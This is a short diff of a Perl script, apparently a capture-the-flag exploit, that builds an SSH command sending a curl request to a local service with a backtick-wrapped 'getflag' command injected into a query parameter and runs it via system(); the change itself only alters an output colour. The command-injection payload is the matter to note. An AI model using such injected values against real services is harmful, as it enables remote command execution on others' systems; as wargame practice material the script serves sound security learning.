@@ -8,5 +8,5 @@ $green = "\e[32m";
 $reset = "\e[0m";
 
 $inject = "ssh -qp 4242 $user\@$ip 'curl localhost:4747/?x=\\`getflag\\`'";
-print $green, $inject, $reset, "\n";
+print $red, $inject, $reset, "\n";
 system($inject);
